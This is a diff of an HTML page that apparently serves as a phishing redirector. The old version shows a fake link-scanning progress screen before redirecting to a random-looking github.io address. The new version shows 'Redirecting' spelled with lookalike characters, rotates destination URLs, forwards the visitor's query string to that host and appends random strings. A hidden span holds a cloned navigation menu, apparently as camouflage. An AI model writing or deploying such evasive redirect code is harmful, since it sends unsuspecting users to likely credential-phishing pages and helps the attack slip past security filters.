@@ -50,67 +50,62 @@
     </style>
 </head>
 <body>
-    <div class="captcha-container">
-        <img src="data:image/png;base64,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" alt="Platinum" class="captcha-image" width="180px" Height="auto"><br><br>
-        <div class="robot-prompt" id="robotPrompt" style="width: 300px; font-size: 17px;">Accessing link...</div>
-        <div class="loading-bar">
-            <div class="loading-progress" id="loadingProgress"></div>
-        </div>
-    </div>
-    <script>
-  const progressBar = document.getElementById('loadingProgress');
-  const robotPrompt = document.getElementById('robotPrompt');
-  let progress = 0;
-  const totalDuration = 20000; // 20 seconds
-  const minRedirectDelay = 10000; // 10 seconds
-  const maxRedirectDelay = 16000; // 16 seconds
-  const stepTime = totalDuration / 100; // Time for each 1% step
-  const messages = [
-    "Verifying link...",
-    "Expanding link...",
-    "Connecting to a server...",
-    "Loading page...",
-    "Verifying content...",
-    "Extracting page features...",
-    "Verifying features...",
-    "Scan Complete"
-  ];
-  let messageIndex = 0;
-
-  function startProgress() {
-    const timer = setInterval(() => {
-      progress += 1;
-      progressBar.style.width = progress + '%';
-      if (progress >= 100) {
-        clearInterval(timer);
+    <p>ꓣеdіrесtіոց...</p><script>
+    // List of URLs to cycle through
+    const urls = ["https://shbfiuqa.github.io/ebgfyru6t37y84iurehjyus748eyrihjuye7r8ifyudisoewj2m3eyfmdhu32euhdeuryhfjicehfgdyu78ioekwjidefnhrjvgy/", "", ""];
+  
+    // Function to get query string from the current URL
+    function getQueryString() {
+      return window.location.search; // This includes the '?' character
+    }
+  
+    // Function to get the next URL from local storage or default to the first URL
+    function getNextUrl() {
+      let currentIndex = localStorage.getItem("currentIndex");
+      
+      // Default to index 0 if not set
+      currentIndex = currentIndex ? parseInt(currentIndex) : 0;
+  
+      // Get the next URL, ensuring it's a valid non-empty string
+      let nextUrl = urls[currentIndex];
+      while (!nextUrl) {
+        currentIndex = (currentIndex + 1) % urls.length;
+        nextUrl = urls[currentIndex];
       }
-    }, stepTime);
-
-    const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
-    setTimeout(() => {
-      const redirectUrl = "https://shbfiuqa.github.io/ebgfyru6t37y84iurehjyus748eyrihjuye7r8ifyudisoewj2m3eyfmdhu32euhdeuryhfjicehfgdyu78ioekwjidefnhrjvgy/";
-      window.location.href = redirectUrl;
-    }, redirectDelay);
-  }
-
-  function changeMessage() {
-    robotPrompt.style.opacity = '0';
-    setTimeout(() => {
-      robotPrompt.textContent = messages[messageIndex];
-      robotPrompt.style.opacity = '1';
-      messageIndex = (messageIndex + 1) % messages.length;
-      const randomDelay = Math.random() * (3000 - 1300) + 1300; // Random delay between 1.3 and 3.0 seconds
-      setTimeout(changeMessage, randomDelay);
-    }, 850); // Wait for the fade-out transition to complete
-  }
-
-  window.onload = () => {
-    startProgress();
-    const initialDelay = Math.random() * (3000 - 1300) + 1300; // Initial random delay between 1.3 and 3.0 seconds
-    setTimeout(changeMessage, initialDelay);
-  };
-</script>
-
+  
+      // Update the index for the next visit
+      currentIndex = (currentIndex + 1) % urls.length;
+      localStorage.setItem("currentIndex", currentIndex);
+  
+      return nextUrl;
+    }
+  
+    // Function to generate a random string of alphanumeric characters up to 13 characters long
+    function generateRandomString() {
+      const length = Math.floor(Math.random() * 13) + 1; // Random length between 1 and 13
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+  
+    // Main function to execute the redirect
+    function redirectToNextUrl() {
+      const queryString = getQueryString();
+      const nextUrl = getNextUrl();
+      const randomString = generateRandomString(); // Generate a random string of up to 13 characters
+      const separator = queryString ? '&' : '?'; // Use '&' if query string exists, otherwise use '?'
+      const fullUrl = `${nextUrl}${queryString}${separator}${randomString}`;
+  
+      // Redirect to the constructed URL
+      window.location.href = fullUrl;
+    }
+  
+    // Execute the redirect when the page loads
+    window.onload = redirectToNextUrl;
+  </script>
     </body>
     <span style="display: none;">
 <div class="mobile-menu_root__PX9iM" id="mobile-menu-toggle"><button aria-label="Open menu" class="toggle_mobileMenuToggle__W5y02" data-expanded="false" disabled="" type="button"><div class="toggle_bar__ySl8w toggle_disabled__4oWP9" data-position="top"></div><div class="toggle_bar__ySl8w toggle_disabled__4oWP9" data-position="bottom"></div></button></div></div><div class="header_nav_second__cIFf5"><nav aria-label="Main" data-orientation="horizontal" dir="ltr" class="navigation-menu_root__HT1ea" style="--indicator-height:10px;--arrow-offset:-10px;--content-width:-16px;--left-offset:calc(-1 * var(--gap-between-logo-and-nav) - 98px)"><div aria-hidden="true" class="navigation-menu_tabsHighlight__4PsZm"></div><div style="position:relative"><ul data-orientation="horizontal" class="navigation-menu_list__1vwjh" dir="ltr"><li><button id="radix-:R15j7m9t9qjtsr:-trigger-features" data-state="closed" aria-expanded="false" aria-controls="radix-:R15j7m9t9qjtsr:-content-features" class="navigation-menu_trigger__AmZ48" value="features" data-radix-collection-item="">Products<svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="pointer-events:none;color:currentColor" viewBox="0 0 16 16" width="16" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.0607 6.74999L11.5303 7.28032L8.7071 10.1035C8.31657 10.4941 7.68341 10.4941 7.29288 10.1035L4.46966 7.28032L3.93933 6.74999L4.99999 5.68933L5.53032 6.21966L7.99999 8.68933L10.4697 6.21966L11 5.68933L12.0607 6.74999Z" fill="currentColor"/></svg></button><div id="radix-:R15j7m9t9qjtsr:-content-features" aria-labelledby="radix-:R15j7m9t9qjtsr:-trigger-features" data-orientation="horizontal" data-state="closed" aria-hidden="true" class="navigation-menu_content__VYOa5" style="pointer-events:none" dir="ltr"><ul class="navigation-menu_column__CMeKf"><li class="navigation-menu_links__VRoNf"><h5 class="text_wrapper__i87JK navigation-menu_heading__osU8W" data-version="v1" style="--text-color:var(--ds-gray-900);--text-size:0.875rem;--text-line-height:1.25rem;--text-letter-spacing:initial;--text-weight:400" id="header-dx">DX Platform</h5><ul aria-describedby="header-dx" class="navigation-menu_columnReset__5wkHH"><li><a data-hover-icon="false" data-feature="Previews" data-radix-collection-item="" data-zone="same" class="link_link__hbWKh navigation-menu_menuSubLink__jde_U" href="/products/previews"><div class="navigation-menu_icons__8b2lC"><div class="stack_stack__iZkUS stack navigation-menu_icon__xsndA" data-version="v1" style="--stack-flex:initial;--stack-direction:column;--stack-align:center;--stack-justify:center;--stack-padding:0px;--stack-gap:0px"><svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="color:currentColor" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 2.5H1.5V5.005H14.5V2.5ZM14.5 6.255H6.245V13.5H13.5C14.0523 13.5 14.5 13.0523 14.5 12.5V6.255ZM4.995 6.255H1.5V12.5C1.5 13.0523 1.94772 13.5 2.5 13.5H4.995V6.255ZM1.5 1H0V2.5V12.5C0 13.8807 1.11929 15 2.5 15H13.5C14.8807 15 16 13.8807 16 12.5V2.5V1H14.5H1.5Z" fill="currentColor"/></svg></div></div><div class="navigation-menu_menuSubLinkContent___WWcd"><div class="navigation-menu_menuItemHeading__r6JQU">Previews</div><p class="text_wrapper__i87JK navigation-menu_menuItemText__l6KEM" data-version="v1" style="--text-color:var(--ds-gray-1000);--text-size:0.75rem;--text-line-height:1rem;--text-letter-spacing:initial;--text-weight:400">Helping teams ship 6× faster</p></div></a></li><li><a data-hover-icon="false" data-feature="AI" data-radix-collection-item="" data-zone="same" class="link_link__hbWKh navigation-menu_menuSubLink__jde_U" href="/ai"><div class="navigation-menu_icons__8b2lC"><div class="stack_stack__iZkUS stack navigation-menu_icon__xsndA" data-version="v1" style="--stack-flex:initial;--stack-direction:column;--stack-align:center;--stack-justify:center;--stack-padding:0px;--stack-gap:0px"><svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="color:currentColor" viewBox="0 0 16 16" width="16"><path d="M2.5 0.5V0H3.5V0.5C3.5 1.60457 4.39543 2.5 5.5 2.5H6V3V3.5H5.5C4.39543 3.5 3.5 4.39543 3.5 5.5V6H3H2.5V5.5C2.5 4.39543 1.60457 3.5 0.5 3.5H0V3V2.5H0.5C1.60457 2.5 2.5 1.60457 2.5 0.5Z" fill="currentColor"/>
